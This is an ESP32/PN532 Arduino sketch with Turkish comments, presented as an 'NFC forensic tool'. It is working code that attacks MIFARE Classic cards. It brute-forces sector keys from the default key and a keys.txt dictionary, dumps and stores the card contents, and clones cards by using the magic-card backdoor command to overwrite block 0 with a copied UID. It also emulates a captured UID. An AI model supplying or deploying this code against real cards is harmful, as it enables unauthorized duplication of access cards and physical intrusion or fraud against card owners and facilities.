#include <Arduino.h>
#include <SPIFFS.h>
#include <PN532_HSU.h>
#include <PN532.h>

// --- BAĞLANTILAR ---
// Elechouse V3 PN532 -> ESP32
// TX  -> GPIO 16 (RX2)
// RX  -> GPIO 17 (TX2)
// DIP SWITCH: OFF - OFF

PN532_HSU pn532_hsu(Serial2);
PN532 nfc(pn532_hsu);

// --- BELLEK YAPISI ---
struct CardProfile {
  byte uid[7];
  byte uidLen;
  byte data[1024]; 
  byte sectorKeys[16][6]; 
  bool sectorSolved[16];  
};

CardProfile activeCard;

// Fonksiyonlar
void analyzeAndSave();    // [R] - Ana Fonksiyon
int findCardInDB(byte* uid, byte len);
void displayDataWithASCII(int sector, int block, byte* data);
bool tryKey(byte* uid, byte len, int sector, byte* key); // Şifre Deneme Yardımcısı
void verifyAndWrite();    // [W]
void emulateActiveCard(); // [E]
void deleteCard(int index);
void listCards();
void loadCardFromDisk(int index);
bool unlockBackdoor();

void setup() {
  Serial.begin(9600);
  delay(1000);
  Serial.println("\n--- ULTIMATE NFC FORENSIC TOOL ---");
  Serial.println("Ozellikler: Dictionary Attack (File), Duplicate Check, ASCII View");
  Serial.println("[R] Oku | [W] Klonla | [E] Taklit | [D] Sil | [L] Liste");

  if (!SPIFFS.begin(true)) Serial.println("SPIFFS Hatasi! (Upload Filesystem yaptin mi?)");

  nfc.begin();
  if (!nfc.getFirmwareVersion()) { Serial.println("PN532 BULUNAMADI!"); while(1); }
  nfc.SAMConfig();
}

void loop() {
  if (Serial.available() > 0) {
    String str = Serial.readStringUntil('\n');
    str.trim(); str.toUpperCase();
    if (str.length() == 0) return;
    
    char cmd = str.charAt(0);
    int idx = str.length() > 1 ? str.substring(1).toInt() : -1;

    if (cmd == 'R') analyzeAndSave();
    else if (cmd == 'L') listCards();
    else if (cmd == 'W') { if(idx>=0){ loadCardFromDisk(idx); verifyAndWrite(); } else Serial.println("Orn: W0"); }
    else if (cmd == 'E') { if(idx>=0){ loadCardFromDisk(idx); emulateActiveCard(); } else Serial.println("Orn: E0"); }
    else if (cmd == 'D') { if(idx>=0) deleteCard(idx); }
  }
}

// --- [R] KAPSAMLI ANALİZ VE SALDIRI ---
void analyzeAndSave() {
  // 1. Dosya Kontrolü
  if (!SPIFFS.exists("/keys.txt")) {
    Serial.println("UYARI: keys.txt bulunamadi! Sadece varsayilan (FFFF...) denenecek.");
  }

  Serial.println("\n=== [R] KART ANALIZ VE SALDIRI MODU ===");
  Serial.println("Karti okuyucuya koyun ve ISLEM BITENE KADAR CEKMEYIN...");

  byte uid[7]; byte len;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) { delay(50); }

  Serial.print("Kart Algilandi! UID: ");
  for(int i=0; i<len; i++) { Serial.print(uid[i], HEX); Serial.print(" "); }
  Serial.println();

  // 2. ÇİFT KAYIT KONTROLÜ
  int existingID = findCardInDB(uid, len);
  if (existingID != -1) {
    Serial.println("\n>>> UYARI: Bu kart zaten ID [ " + String(existingID) + " ] olarak kayitli! <<<");
    Serial.println("Islem iptal edildi.");
    return;
  }

  // 3. HAZIRLIK
  memset(&activeCard, 0, sizeof(CardProfile));
  memcpy(activeCard.uid, uid, len);
  activeCard.uidLen = len;

  Serial.println("Sifre kirma ve okuma basliyor...");
  Serial.println("----------------------------------------------------------------");
  Serial.println("Sekt | Blk | HEX VERISI (Raw)                | ASCII (Metin)    ");
  Serial.println("-----+-----+---------------------------------+------------------");

  // 4. SEKTÖR TARAMA DÖNGÜSÜ
  for (int s = 0; s < 16; s++) {
    bool cracked = false;
    byte foundKey[6];

    // ADIM A: Önce Fabrika Varsayılanını Dene (Hız için)
    byte defaultKey[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (tryKey(uid, len, s, defaultKey)) {
      memcpy(foundKey, defaultKey, 6);
      cracked = true;
    } 
    // ADIM B: Eğer açılmazsa DOSYADAKİLERİ dene
    else if (SPIFFS.exists("/keys.txt")) {
      File file = SPIFFS.open("/keys.txt", "r");
      while (file.available()) {
        String line = file.readStringUntil('\n'); line.trim();
        if (line.length() != 12) continue;

        // String -> Byte Array
        byte fileKey[6];
        for (int i = 0; i < 6; i++) {
          char b[3] = {line.charAt(i*2), line.charAt(i*2+1), 0};
          fileKey[i] = (byte)strtol(b, NULL, 16);
        }

        if (tryKey(uid, len, s, fileKey)) {
          memcpy(foundKey, fileKey, 6);
          cracked = true;
          break; // Şifreyi bulduk, dosyayı okumayı bırak, diğer sektöre geç
        }
      }
      file.close();
    }

    // SONUÇLARI İŞLE
    if (cracked) {
      memcpy(activeCard.sectorKeys[s], foundKey, 6);
      activeCard.sectorSolved[s] = true;
      
      // Veriyi Oku ve Ekrana Bas
      for (int b = 0; b < 4; b++) {
        int blk = (s*4)+b;
        nfc.mifareclassic_ReadDataBlock(blk, &activeCard.data[blk*16]);
        displayDataWithASCII(s, blk, &activeCard.data[blk*16]);
      }
    } else {
      Serial.print("  "); Serial.print(s); 
      Serial.println("  | ??? | -- KILITLI (Dictionary yetersiz) -- | ?????");
    }
  }

  // 5. KAYDETME
  int newID = 0;
  while(SPIFFS.exists("/card_"+String(newID)+".bin")) newID++;
  
  File f = SPIFFS.open("/card_" + String(newID) + ".bin", "w");
  f.write((byte*)&activeCard, sizeof(CardProfile));
  f.close();

  Serial.println("----------------------------------------------------------------");
  Serial.print(">>> KAYIT BASARILI! Yeni ID: [ "); Serial.print(newID); Serial.println(" ] <<<");
}

// --- YARDIMCI: TEK ŞİFRE DENEME ---
bool tryKey(byte* uid, byte len, int sector, byte* key) {
  // Authentication başarılıysa true döner
  return nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 0, key);
}

// --- ASCII ANALİZ ---
void displayDataWithASCII(int sector, int block, byte* data) {
  if(sector < 10) Serial.print("  "); else Serial.print(" ");
  Serial.print(sector); Serial.print(" | ");
  if(block < 10) Serial.print(" ");
  Serial.print(block); Serial.print("  | ");

  for(int i=0; i<16; i++) {
    if(data[i] < 0x10) Serial.print("0");
    Serial.print(data[i], HEX); Serial.print(" ");
  }
  Serial.print("| ");

  for(int i=0; i<16; i++) {
    char c = data[i];
    if (c >= 32 && c <= 126) Serial.print(c);
    else Serial.print(".");
  }
  Serial.println();
}

// --- DUPLICATE CHECK ---
int findCardInDB(byte* uid, byte len) {
  int id = 0;
  while(1) {
    String fname = "/card_" + String(id) + ".bin";
    if(!SPIFFS.exists(fname)) break;
    File f = SPIFFS.open(fname, "r");
    if(f) {
      CardProfile temp;
      f.read((byte*)&temp, sizeof(CardProfile));
      f.close();
      if(temp.uidLen == len && memcmp(temp.uid, uid, len) == 0) return id;
    }
    id++;
  }
  return -1;
}

// --- DİĞER FONKSİYONLAR ---
void deleteCard(int index) {
  if(SPIFFS.remove("/card_"+String(index)+".bin")) Serial.println("Silindi.");
  else Serial.println("Hata.");
}

void listCards() {
  Serial.println("\n--- VERITABANI ---");
  int i=0;
  while(i<100) {
    if(SPIFFS.exists("/card_"+String(i)+".bin")) {
      Serial.print("ID [ "); Serial.print(i); Serial.println(" ] - Kayitli");
    }
    i++;
  }
}

void loadCardFromDisk(int index) {
  String n = "/card_" + String(index) + ".bin";
  if(!SPIFFS.exists(n)) { Serial.println("Gecersiz ID"); return; }
  File f = SPIFFS.open(n, "r");
  f.read((byte*)&activeCard, sizeof(CardProfile));
  f.close();
  Serial.println("Yuklendi.");
}

void verifyAndWrite() {
  Serial.println("Bos karti koyun...");
  byte uid[7]; byte len;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) {}
  unlockBackdoor();
  uint8_t k[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  
  if(nfc.mifareclassic_AuthenticateBlock(uid,len,0,0,k)) {
     if(nfc.mifareclassic_WriteDataBlock(0, &activeCard.data[0])) Serial.println("UID OK.");
  }
  
  nfc.inListPassiveTarget(); nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 100);
  
  for(int s=1; s<16; s++) {
    if(!activeCard.sectorSolved[s]) continue; // Sadece çözülenleri yaz
    if(nfc.mifareclassic_AuthenticateBlock(uid,len,s*4,0,k)) {
      for(int b=0; b<3; b++) { // Blok 3'e dokunma
         int blk = (s*4)+b;
         nfc.mifareclassic_WriteDataBlock(blk, &activeCard.data[blk*16]);
      }
    }
  }
  Serial.println("Yazma Bitti.");
}

void emulateActiveCard() {
  Serial.println("Emulasyon (Telefon Uyumlu) Baslatildi...");
  byte cmd[] = {0x00, 0x04, 0x00, activeCard.uid[0], activeCard.uid[1], activeCard.uid[2], 0x20};
  nfc.setPassiveActivationRetries(0xFF);
  while(1) {
    if(nfc.tgInitAsTarget(cmd, sizeof(cmd)) == 1) {
      uint8_t b[255]; uint8_t l=sizeof(b);
      if(nfc.tgGetData(b, l) > 0) {
        Serial.println(">> TELEFON BAGLANDI! <<");
        uint8_t r[]={0x00}; nfc.tgSetData(r,1);
        delay(100);
      }
    }
    delay(20);
  }
}

bool unlockBackdoor() {
  byte u[]={0x43}; byte r[32]; uint8_t l=32;
  return (nfc.inDataExchange(u,1,r,&l) && l>0 && r[0]==0x0A);
}